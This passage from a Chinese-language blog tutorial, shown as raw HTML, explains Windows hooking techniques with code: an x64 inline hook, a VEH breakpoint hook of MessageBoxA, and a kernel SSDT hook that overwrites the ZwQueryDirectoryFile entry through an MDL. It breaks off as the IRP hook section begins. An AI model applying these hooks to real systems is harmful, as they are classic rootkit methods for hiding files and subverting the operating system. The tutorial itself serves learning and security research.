class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span></div><div class="line"><span class="regexp">//</span>                   不懂                            <span class="regexp">//</span></div><div class="line"><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span></div><div class="line">ULONG DataOffset = <span class="number">0</span>;</div><div class="line">ULONG_PTR pData = (ULONG_PTR)pHookData-&gt;HookPoint + <span class="number">7</span> + <span class="number">7</span> + *(ULONG*)(pHookData-&gt;HookPoint + <span class="number">10</span>);</div><div class="line">printf(<span class="string">"pData = 0x%p\n"</span>, pData);</div><div class="line">DataOffset = (ULONG)(pData - ((ULONG_PTR)pFun + <span class="number">14</span>));</div><div class="line">*(ULONG*)(pFun + <span class="number">10</span>) = DataOffset;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二点，就是在X86下面，修改指令的长度最大是7个字节，在X64下变成了14个字节，而且地址长度变成了8个字节。并且使用的指令E9变成了FF25这种长跳转指令。<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//64位jmp</span></div><div class="line"><span class="function"><span class="title">memset</span>(pHookData-&gt;</span>newEntry, <span class="number">0</span>, <span class="number">14</span>);</div><div class="line"><span class="function"><span class="title">pHookData</span>-&gt;</span>newEntry[<span class="number">0</span>] = <span class="number">0</span>xFF;</div><div class="line"><span class="function"><span class="title">pHookData</span>-&gt;</span>newEntry[<span class="number">1</span>] = <span class="number">0</span>x25;</div><div class="line"><span class="comment">//2-5是全0</span></div><div class="line">*(ULONG_PTR*)(<span class="function"><span class="title">pHookData</span>-&gt;</span><span class="function"><span class="title">newEntry</span> + 6) = (ULONG_PTR)pHookData-&gt;</span>pfnDetourFun;</div></pre></td></tr></table></figure></p><h1 id="0x3-VEH-HOOK"><a href="#0x3-VEH-HOOK" class="headerlink" title="0x3 VEH_HOOK"></a>0x3 VEH_HOOK</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VEH技术的主要原理是利用异常处理改变程序指令流程。通过主动抛出异常，使程序触发异常，控制权交给异常处理例程的这一系列操作来实现HOOK。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里简单提一下VEH，向量异常处理，基于VEH链表而不是栈，这样的话其作用范围是进程全局，而不是线程。且优先级也高于SEH，这也是VEH_HOOK的优势所在。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VEH_HOOK通过异常机制实现HOOK，必不可少需要构造异常处理函数，同时也需要人为的构造异常，同时为了实现永久化机制，保证执行原操作需要实现TrampolineFun函数。所以总结VEH_HOOK步骤如下：</p><ul><li>1.构造TrampolineFun</li><li>2.构造异常处理函数，即Detour函数</li><li>3.人为构造异常。</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 构造TrampolineFun的目的1是为了执行原有流程，2是实现永久化。因为64位不支持内联汇编，所以需要开辟空间来存放shellcode。复制前四个指令，实现堆栈平衡，然后为了永久化，特定将跳转点定在函数开头后四个字节处。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">pFun = (PBYTE)VirtualAlloc(NULL, <span class="number">128</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</div><div class="line">uResult = (ULONG_PTR)pFun;</div><div class="line">if (NULL == pFun)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"VirtualAlloc%d<span class="subst">\n</span>"</span>, GetLastError());</div><div class="line">return NULL;</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">memset(pFun, <span class="number">0</span>, <span class="number">128</span>);</div><div class="line">memcpy(pFun, g_AddressOfMsgBox, <span class="number">4</span>);   <span class="comment">//复制MsgBox前四个字节</span></div><div class="line">pFun += <span class="number">4</span>;</div><div class="line">pFun[<span class="number">0</span>] = <span class="number">0xFF</span>;</div><div class="line">pFun[<span class="number">1</span>] = <span class="number">0x25</span>;</div><div class="line">*(ULONG_PTR*)(pFun + <span class="number">6</span>) = (ULONG_PTR)g_AddressOfMsgBox + <span class="number">4</span>;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造异常处理函数，这个函数就是Detour函数，同时也是我们异常处理的函数，所以他的参数是一个_EXCEPTION_POINTERS结构。根据看雪加密解密所介绍，他是一个陷进帧，用来存放EXCEPTION_RECORD和 CONTEXT_RECORD。EXCEPTION_RECORD保存发生异常的基本信息，<strong>如异常类型，发生异常的地址</strong>。而二是CONTEXT_RECORD用于保存上下文。<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">LONG WINAPI VectoredHandler1(struct _EXCEPTION_POINTERS *ExceptionInfo)</div><div class="line">&#123;</div><div class="line"><span class="comment">//初始化异常信息</span></div><div class="line"><span class="function"><span class="title">pExceptionRecord</span> = ExceptionInfo-&gt;</span>ExceptionRecord;</div><div class="line"><span class="function"><span class="title">pContextRecord</span> = ExceptionInfo-&gt;</span>ContextRecord;</div><div class="line"><span class="comment">//如果异常发生在Msgbox，且异常原因是断点异常。</span></div><div class="line"><span class="function"><span class="title">if</span> (pExceptionRecord-&gt;</span>ExceptionAddress == g_AddressOfMsgBox</div><div class="line">&amp;&amp; <span class="function"><span class="title">pExceptionRecord</span>-&gt;</span>ExceptionCode == EXCEPTION_BREAKPOINT)</div><div class="line">&#123;</div><div class="line"><span class="comment">//此处执行你想要的操作。</span></div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为X64是采用了类似于FastCall的调用约定，所以压栈顺序为RCX,RDX,R8,R9。同时也是从右到左的传参方式。所以，修改RDX就可以修改MsgBox的第二个参数。<strong>同时，别忘记修改Eip到TrampolineFun</strong>。对于x86平台下的，只需要修改栈顶第二个参数就可以了。<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">|<span class="type">|#ifdef</span> _WIN64</div><div class="line">pContextRecord-&gt;Rdx = (ULONG_PTR)szText;</div><div class="line">pContextRecord-&gt;Rip = g_OriginalMessageBoxA;</div><div class="line">|<span class="type">|#else</span></div><div class="line">/*</div><div class="line"><span class="number">0012</span>FF70   <span class="number">0040105</span>A   /CALL 到 MessageBoxA 来自 VEHHook<span class="number">.00401054</span></div><div class="line"><span class="number">0012</span>FF74   <span class="number">00000000</span>   |<span class="type">hOwner</span> = NULL</div><div class="line"><span class="number">0012</span>FF78   <span class="number">00407030</span>   |<span class="type">Text</span> = <span class="string">"VEH Hook"</span></div><div class="line"><span class="number">0012</span>FF7C   <span class="number">0040703</span>C   |<span class="type">Title</span> = <span class="string">"Test"</span></div><div class="line"><span class="number">0012</span>FF80   <span class="number">00000000</span>   \Style = MB_OK|<span class="type">MB_APPLMODAL</span></div><div class="line"><span class="number">0012</span>FF84   <span class="number">00401225</span>   返回到 VEHHook.&lt;ModuleEntryPoint&gt;+<span class="number">0</span>B4 来自 VEHHook<span class="number">.00401000</span></div><div class="line">*/</div><div class="line">ULONG_PTR* uEsp = (ULONG_PTR*)pContextRecord-&gt;Esp;   //截断栈</div><div class="line">uEsp[<span class="number">2</span>] = (ULONG_PTR)szText;</div><div class="line">pContextRecord-&gt;Eip = (ULONG_PTR)g_OriginalMessageBoxA; //跳过函数开头</div><div class="line">|<span class="type">|#endif</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置异常，这里选择的是简单的断点异常。直接将Target原始代码修改一个字节为0xCC即可！<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">g_OldCode[<span class="number">0</span>] = *pTarget;</div><div class="line"><span class="keyword">if</span> (!VirtualProtect(pTarget, <span class="keyword">sizeof</span>(BYTE), PAGE_EXECUTE_READWRITE, &amp;dwOldProtect))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"VirtualProtect:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"><span class="comment">//修改CC</span></div><div class="line">pTarget[<span class="number">0</span>] = <span class="number">0xCC</span>;</div><div class="line"><span class="keyword">if</span> (!VirtualProtect(pTarget, <span class="keyword">sizeof</span>(BYTE), dwOldProtect, &amp;dwOldProtect))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"VirtualProtect:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h1 id="0x4-SSDT-HOOK"><a href="#0x4-SSDT-HOOK" class="headerlink" title="0x4 SSDT_HOOK"></a>0x4 SSDT_HOOK</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSDT中文全称为<strong>系统服务描述符表</strong>，其作用是作为R3和R0层的通道，将用户态API函数和内核函数联系起来。用简单的API函数举例子，我们调用了CreateFile,其会调用ZwCreateFile,然后调用NtCreateFile，经过参数和模式的检查，然后调用系统服务分发函数KiSystemService进入内核。在R0中通过传入的系统服务号(函数索引)得到系统服务的地址，然后调用该系统服务即可。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以，根据上述，我们可以知道SSDT其实是一个存储系统服务的数组。SSDT_HOOK其实就是在内核层的AddressHook。只不过他修改是系统服务描述符表数据。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为SSDT的索引号和系统服务内核地址是一一对应的，所以不需要向普通的AddressHook一一对比函数地址。所以让我们来屡一下执行SSDT的操作。我们有目的向原因开始。如果我们需要执行SSDT_HOOK的话，首先需要修改为与SSDT中的系统服务地址，但又由于系统服务地址是和服务索引是保持对应关系的，所以我们还需要获取索引号。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上面的分析，我们知道首先需要获取服务索引号。但是服务索引号和函数地址对应的，<strong>在X86系统中，相对于导出函数偏移量1的地址往后读四个字节就是SSDT服务索引号。但是对于X64位的系统，却是函数地址偏移为4的地址读取四个字节。</strong>所以需要得到服务索引号，就需要得到导出函数地址。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们现在总结一下得到服务索引的步骤：</p><ul><li>Step1：将Ntdll.dll载入内存</li><li>Step2：获取导出函数地址</li><li>Step3：计算函数索引</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSDT适用于R0内，在内核层映射文件到内存和在应用层是一致的。只是使用的函数不一样,首先使用<code>InitializeObjectAttributes</code>初始化文件对象，然后使用<code>ZwOpenFile</code>获得映射文件句柄,接着使用<code>ZwCreateSection</code>创建创建一个节对象。最后使用<code>ZwMapViewOfSection</code>,这些都是固定的模板，代码如下。<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">//初始化文件对象</div><div class="line">InitializeObjectAttributes(&amp;objectAttributes,</div><div class="line">&amp;ustrDllFileName,</div><div class="line">OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, </div><div class="line">NULL, NULL);</div><div class="line">//获得映射文件句柄</div><div class="line"><span class="built_in">status</span> = ZwOpenFile(&amp;hFile,</div><div class="line">GENERIC_READ,</div><div class="line">&amp;objectAttributes, </div><div class="line">&amp;iosb, </div><div class="line">FILE_SHARE_READ,</div><div class="line">FILE_SYNCHRONOUS_IO_NONALERT);</div><div class="line"><span class="keyword">if</span> (!NT_SUCCESS(<span class="built_in">status</span>))</div><div class="line">&#123;</div><div class="line">//DbgPrint宏定义</div><div class="line">KdPrint((<span class="string">"ZwOpenFile Error! [error code: 0x%X]"</span>, <span class="built_in">status</span>));</div><div class="line"><span class="keyword">return</span> <span class="built_in">status</span>;</div><div class="line">&#125;</div><div class="line">//创建一个节对象</div><div class="line"><span class="built_in">status</span> = ZwCreateSection(&amp;hSection, SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, <span class="number">0</span>, PAGE_READWRITE, <span class="number">0x100000</span>, hFile);</div><div class="line"><span class="keyword">if</span> (!NT_SUCCESS(<span class="built_in">status</span>))</div><div class="line">&#123;</div><div class="line">//DbgPrint宏定义</div><div class="line">ZwClose(hFile);</div><div class="line">KdPrint((<span class="string">"ZwCreateSection Error! [error code: 0x%X]"</span>, <span class="built_in">status</span>));</div><div class="line"><span class="keyword">return</span> <span class="built_in">status</span>;</div><div class="line">&#125;</div><div class="line">//将文件映射到内存</div><div class="line"><span class="built_in">status</span> = ZwMapViewOfSection(hSection, GetCurrentProcess(), &amp;pBaseAddress, <span class="number">0</span>, <span class="number">1024</span>,<span class="number">0</span>, &amp;viewSize,ViewShare, MEM_TOP_DOWN, PAGE_READWRITE);</div><div class="line"><span class="keyword">if</span> (!NT_SUCCESS(<span class="built_in">status</span>))</div><div class="line">&#123;</div><div class="line">//DbgPrint宏定义</div><div class="line">ZwClose(hFile);</div><div class="line">ZwClose(hSection);</div><div class="line">KdPrint((<span class="string">"ZwMapViewOfSection Error! [error code: 0x%X]"</span>, <span class="built_in">status</span>));</div><div class="line"><span class="keyword">return</span> <span class="built_in">status</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将Ntdll映射到内存中，然后就想普通的获取导出函数地址的方式获取对应的函数地址，然后根据公式获取服务索引。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ULONG</span> GetIndexFromExportTable(PVOID pBaseAddress, PCHAR pszFunctionName)</div><div class="line">&#123;</div><div class="line"><span class="keyword">ULONG</span> ulFunctionIndex = <span class="number">0</span>;</div><div class="line"><span class="comment">// Dos Header</span></div><div class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBaseAddress;</div><div class="line"><span class="comment">// NT Header</span></div><div class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)pDosHeader + pDosHeader-&gt;e_lfanew);</div><div class="line"><span class="comment">// Export Table</span></div><div class="line">PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress);</div><div class="line"><span class="comment">// 有名称的导出函数个数</span></div><div class="line"><span class="keyword">ULONG</span> ulNumberOfNames = pExportTable-&gt;NumberOfNames;</div><div class="line"><span class="comment">// 导出函数名称地址表</span></div><div class="line">PULONG lpNameArray = (PULONG)((PUCHAR)pDosHeader + pExportTable-&gt;AddressOfNames);</div><div class="line">PCHAR lpName = <span class="keyword">NULL</span>;</div><div class="line"><span class="comment">// 开始遍历导出表</span></div><div class="line"><span class="keyword">for</span> (<span class="keyword">ULONG</span> i = <span class="number">0</span>; i &lt; ulNumberOfNames; i++)</div><div class="line">&#123;</div><div class="line">lpName = (PCHAR)((PUCHAR)pDosHeader + lpNameArray[i]);</div><div class="line"><span class="comment">// 判断是否查找的函数</span></div><div class="line"><span class="keyword">if</span> (<span class="number">0</span> == _strnicmp(pszFunctionName, lpName, strlen(pszFunctionName)))</div><div class="line">&#123;</div><div class="line"><span class="comment">// 获取导出函数地址</span></div><div class="line">USHORT uHint = *(USHORT *)((PUCHAR)pDosHeader + pExportTable-&gt;AddressOfNameOrdinals + <span class="number">2</span> * i);</div><div class="line"><span class="keyword">ULONG</span> ulFuncAddr = *(PULONG)((PUCHAR)pDosHeader + pExportTable-&gt;AddressOfFunctions + <span class="number">4</span> * uHint);</div><div class="line">PVOID lpFuncAddr = (PVOID)((PUCHAR)pDosHeader + ulFuncAddr);</div><div class="line"><span class="comment">// 获取 SSDT 函数 Index</span></div><div class="line">|<span class="comment">#ifdef _WIN64</span></div><div class="line">ulFunctionIndex = *(<span class="keyword">ULONG</span> *)((PUCHAR)lpFuncAddr + <span class="number">4</span>);</div><div class="line">|<span class="comment">#else</span></div><div class="line">ulFunctionIndex = *(<span class="keyword">ULONG</span> *)((PUCHAR)lpFuncAddr + <span class="number">1</span>);</div><div class="line">|<span class="comment">#endif</span></div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> ulFunctionIndex;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为SSDT在x86系统上是由Ntoskrnl.exe导出，导出符号为KeServiceDesriptorTable，我们很容易获取SSDT的地址。只需要获取KeServiceDesriptorTable即可！也就是使用以下语句，同时给出_SERVICE_DESCIPTOR_TABLE结构，可以看到结构体第一个成员是SSDT基址，所以可以使用<code>(PVOID)KeServiceDescriptorTable.ServiceTableBase[ulSSDTFunctionIndex];</code>获取函数基地址。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">extern</span> SSDTEntry __declspec(dllimport) KeServiceDescriptorTable;</div><div class="line"><span class="comment">//_SERVICE_DESCIPTOR_TABLE结构</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SERVICE_DESCIPTOR_TABLE</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">PULONG ServiceTableBase;  <span class="comment">// SSDT基址</span></div><div class="line">PULONG ServiceCounterTableBase;   <span class="comment">// SSDT中服务被调用次数计数器</span></div><div class="line">ULONG NumberOfService;            <span class="comment">// SSDT服务个数</span></div><div class="line">PUCHAR ParamTableBase;      <span class="comment">// 系统服务参数表基址</span></div><div class="line">&#125;SSDTEntry, *PSSDTEntry;</div><div class="line"><span class="comment">//获取服务地址</span></div><div class="line">pFunctionAddress = (PVOID)KeServiceDescriptorTable.ServiceTableBase[ulSSDTFunctionIndex];</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们已经找到了目标函数在SSDT的地址，最后，我们只需要在该地址处填写我们构造的函数地址即可！！但是这块内存是有保护属性的，所以我们需要使用MDL方式绕过写保护属性。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 使用 MDL 方式修改 SSDT</span></div><div class="line">pMdl = MmCreateMdl(<span class="keyword">NULL</span>, &amp;KeServiceDescriptorTable.ServiceTableBase[ulSSDTFunctionIndex], sizeof(<span class="keyword">ULONG</span>));</div><div class="line"><span class="keyword">if</span> (<span class="keyword">NULL</span> == pMdl)</div><div class="line">&#123;</div><div class="line">DbgPrint(<span class="string">"MmCreateMdl Error!\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line">MmBuildMdlForNonPagedPool(pMdl);</div><div class="line">pNewAddress = MmMapLockedPages(pMdl, KernelMode);</div><div class="line"><span class="keyword">if</span> (<span class="keyword">NULL</span> == pNewAddress)</div><div class="line">&#123;</div><div class="line">IoFreeMdl(pMdl);</div><div class="line">DbgPrint(<span class="string">"MmMapLockedPages Error!\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 写入新函数地址</span></div><div class="line">ulNewFuncAddr = (<span class="keyword">ULONG</span>)New_ZwQueryDirectoryFile;</div><div class="line">RtlCopyMemory(pNewAddress, &amp;ulNewFuncAddr, sizeof(<span class="keyword">ULONG</span>));</div><div class="line"><span class="comment">// 释放</span></div><div class="line">MmUnmapLockedPages(pNewAddress, pMdl);</div><div class="line">IoFreeMdl(pMdl);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样的，卸载HOOK，只需要将之前的修改恢复就可以了<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">BOOLEAN</span> SSDTUnhook()</div><div class="line">&#123;</div><div class="line">UNICODE_STRING ustrDllFileName;</div><div class="line"><span class="keyword">ULONG</span> ulSSDTFunctionIndex = <span class="number">0</span>;</div><div class="line">PVOID pSSDTFunctionAddress = <span class="keyword">NULL</span>;</div><div class="line">PMDL pMdl = <span class="keyword">NULL</span>;</div><div class="line">PVOID pNewAddress = <span class="keyword">NULL</span>;</div><div class="line"><span class="keyword">ULONG</span> ulOldFuncAddr = <span class="number">0</span>;</div><div class="line">RtlInitUnicodeString(&amp;ustrDllFileName, L<span class="string">"\\??\\C:\\Windows\\System32\\ntdll.dll"</span>);</div><div class="line"><span class="comment">// 从 ntdll.dll 中获取 SSDT 函数索引号</span></div><div class="line">ulSSDTFunctionIndex = GetSSDTFunctionIndex(ustrDllFileName, <span class="string">"ZwQueryDirectoryFile"</span>);</div><div class="line"><span class="comment">// 使用 MDL 方式修改 SSDT</span></div><div class="line">pMdl = MmCreateMdl(<span class="keyword">NULL</span>, &amp;KeServiceDescriptorTable.ServiceTableBase[ulSSDTFunctionIndex], sizeof(<span class="keyword">ULONG</span>));</div><div class="line"><span class="keyword">if</span> (<span class="keyword">NULL</span> == pMdl)</div><div class="line">&#123;</div><div class="line">DbgPrint(<span class="string">"MmCreateMdl Error!\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line">MmBuildMdlForNonPagedPool(pMdl);</div><div class="line">pNewAddress = MmMapLockedPages(pMdl, KernelMode);</div><div class="line"><span class="keyword">if</span> (<span class="keyword">NULL</span> == pNewAddress)</div><div class="line">&#123;</div><div class="line">IoFreeMdl(pMdl);</div><div class="line">DbgPrint(<span class="string">"MmMapLockedPages Error!\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 写入原函数地址</span></div><div class="line">ulOldFuncAddr = (<span class="keyword">ULONG</span>)g_pOldSSDTFunctionAddress;</div><div class="line">RtlCopyMemory(pNewAddress, &amp;ulOldFuncAddr, sizeof(<span class="keyword">ULONG</span>));</div><div class="line"><span class="comment">// 释放</span></div><div class="line">MmUnmapLockedPages(pNewAddress, pMdl);</div><div class="line">IoFreeMdl(pMdl);</div><div class="line"><span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h1 id="0x5-IRP-Hook"><a href="#0x5-IRP-Hook" class="headerlink" title="0x5 IRP_Hook"></a>0x5 IRP_Hook</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IRP全称是IO请求包，发送到设备驱动程序的大多数请求都打包在IRP中。操作系统组件或驱动程序通过调用IoCallDriver将IRP发送给驱动程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;大概的执行流程是这样的：IO管理器创建一个IRP来代表一个IO操作，并且将该IRP传递给正确的驱动程序，当此IO操作完成时再处理该请求包。相对的，驱动程序(上层的虚拟设备驱动或者底层的真实设备驱动)接收一个IRP，执行该IRP指定的操作，然后将IRP传回给IO管理器，告诉它，该操作已经完成，或者应该传给另一个驱动以进行进一步处理。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IO管理器可以使用一下三个函数创建IRP。<strong>但此时，IRP堆栈还没有被初始化，难以进行拦截。</strong>然后使用你可以调用IoGetNextIrpStackLocation函数获得该IRP第一个堆栈单元的指针。然后初始化这个堆栈单元。当初始化完成之后，就可以调用IoCallDriver函数把IRP发送到设备驱动程序了。<strong>这就可以在中途进行拦截啦。</strong></p><ul><li><code>IoBuildAsynchronousFsdRequest 创建异步IRP</code></li><li><code>IoBuildSynchronousFsdRequest 创建同步IRP</code></li><li><code>IoBuildDeviceIoControlRequest 创建一个同步IRP_MJ_DEVICE_CONTROL或IRP_MJ_INTERNAL_DEVICE_CONTROL请求。</code></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述流程，执行IrpHook可以在三个地址进行，第一：在Irp初始化之后，第二：在发往派遣例程过程中，第三，直接修改需要拦截驱动对象派遣例程函数表。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过查看 IofCallDriver函数发现，在函数开头存在一个jmp指令。<code>ff2500c85480</code>其中ff25是jmp的机器码，后面的机器码是跳转的绝对地址。可以使用InlineHook直接修改跳转地址即可<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div 